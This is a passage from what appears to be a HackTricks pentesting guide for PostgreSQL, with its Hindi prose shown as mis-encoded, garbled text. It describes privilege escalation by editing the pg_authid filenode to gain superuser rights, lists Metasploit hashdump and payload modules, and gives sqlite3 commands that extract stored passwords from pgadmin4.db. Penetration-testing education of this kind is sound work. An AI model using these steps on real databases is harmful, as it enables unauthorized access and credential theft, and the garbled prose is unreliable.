**рдЗрд╕ рддрдХрдиреАрдХ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдкрдврд╝реЗрдВ [**рдпрд╣рд╛рдВ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**ред**

рд╣рдорд▓реЗ рдХреЗ рдЪрд░рдг рд╣реИрдВ:

1. PostgreSQL рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
2. `pg_authid` рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓рдиреЛрдб рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдкреЗрдХреНрд╖ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
3. `lo_*` рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рд╛рдЗрд▓рдиреЛрдб рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ
4. `pg_authid` рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
5. [PostgreSQL рдлрд╝рд╛рдЗрд▓рдиреЛрдб рд╕рдВрдкрд╛рджрдХ](https://github.com/adeadfed/postgresql-filenode-editor) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ [рдлрд╝рд╛рдЗрд▓рдиреЛрдб рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); рд╕рднреА `rol*` рдмреВрд▓рд┐рдпрди рдлреНрд▓реИрдЧреНрд╕ рдХреЛ рдкреВрд░реНрдг рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП 1 рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред
6. рд╕рдВрдкрд╛рджрд┐рдд рдлрд╝рд╛рдЗрд▓рдиреЛрдб рдХреЛ `lo_*` рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд┐рд░ рд╕реЗ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ, рдФрд░ рдбрд┐рд╕реНрдХ рдкрд░ рдореВрд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ
7. _(рд╡реИрдХрд▓реНрдкрд┐рдХ)_ рдПрдХ рдорд╣рдВрдЧрд╛ SQL рдХреНрд╡реЗрд░реА рдЪрд▓рд╛рдХрд░ рдЗрди-рдореЗрдореЛрд░реА рддрд╛рд▓рд┐рдХрд╛ рдХреИрд╢ рдХреЛ рд╕рд╛рдлрд╝ рдХрд░реЗрдВ
8. рдЕрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдкреВрд░реНрдг рд╕реБрдкрд░admin рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдПред

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

_**postgresql.conf**_ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдмрджрд▓рдХрд░ postgresql рд▓реЙрдЧ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
рдлрд┐рд░, **рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рдХрд░реЗрдВ**ред

### pgadmin

[pgadmin](https://www.pgadmin.org) PostgreSQL рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рд╢рд╛рд╕рди рдФрд░ рд╡рд┐рдХрд╛рд╕ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╣реИред\
рдЖрдк _**pgadmin4.db**_ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ **рдкрд╛рд╕рд╡рд░реНрдб** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдЕрдВрджрд░ _**decrypt**_ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

PostgreSQL рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **pg\_hba.conf** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд░рд┐рдХреЙрд░реНрдб рдХреА рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рд╣реЛрддреА рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдПрдХ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдХрд╛рд░, рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдИрдкреА рдкрддрд╛ рд░реЗрдВрдЬ (рдпрджрд┐ рд▓рд╛рдЧреВ рд╣реЛ), рдбреЗрдЯрд╛рдмреЗрд╕ рдирд╛рдо, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдФрд░ рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИред рдкрд╣рд▓рд╛ рд░рд┐рдХреЙрд░реНрдб рдЬреЛ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдХрд╛рд░, рдХреНрд▓рд╛рдЗрдВрдЯ рдкрддрд╛, рдЕрдиреБрд░реЛрдзрд┐рдд рдбреЗрдЯрд╛рдмреЗрд╕, рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдХреЛрдИ рдмреИрдХрдЕрдк рдпрд╛ рдлреЙрд▓рдмреИрдХ рдирд╣реАрдВ рд╣реЛрддрд╛ред рдпрджрд┐ рдХреЛрдИ рд░рд┐рдХреЙрд░реНрдб рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХреНрд╕реЗрд╕ рдЕрд╕реНрд╡реАрдХреГрдд рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

pg\_hba.conf рдореЗрдВ рдЙрдкрд▓рдмреНрдз рдкрд╛рд╕рд╡рд░реНрдб-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐рдпрд╛рдБ **md5**, **crypt**, рдФрд░ **password** рд╣реИрдВред рдпреЗ рд╡рд┐рдзрд┐рдпрд╛рдБ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рдЯреНрд░рд╛рдВрд╕рдорд┐рд╢рди рдХреЗ рддрд░реАрдХреЗ рдореЗрдВ рднрд┐рдиреНрди рд╣реЛрддреА рд╣реИрдВ: MD5-рд╣реИрд╢ рдХрд┐рдпрд╛ рд╣реБрдЖ, рдХреНрд░рд┐рдкреНрдЯ-рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб, рдпрд╛ рдХреНрд▓рд┐рдпрд░-рдЯреЗрдХреНрд╕реНрдЯред рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдХреНрд░рд┐рдкреНрдЯ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрди рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ pg\_authid рдореЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╣реИрдВред

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}
